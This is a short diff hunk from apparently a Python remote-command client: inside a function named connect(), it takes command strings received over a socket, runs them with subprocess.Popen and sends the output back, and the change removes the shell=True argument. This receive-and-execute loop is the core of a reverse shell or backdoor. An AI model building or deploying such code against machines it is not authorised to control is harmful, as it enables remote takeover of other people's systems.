@@ -91,7 +91,7 @@ def connect():
                     except Exception as l:
                         s.send(str(l).encode())
                 elif len(data) > 0:
-                    proc = subprocess.Popen(data.decode("utf-8"), shell=True, 
+                    proc = subprocess.Popen(data.decode("utf-8"), 
                                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                             stdin=subprocess.PIPE)
                     stdout = proc.stdout.read() + proc.stderr.read()
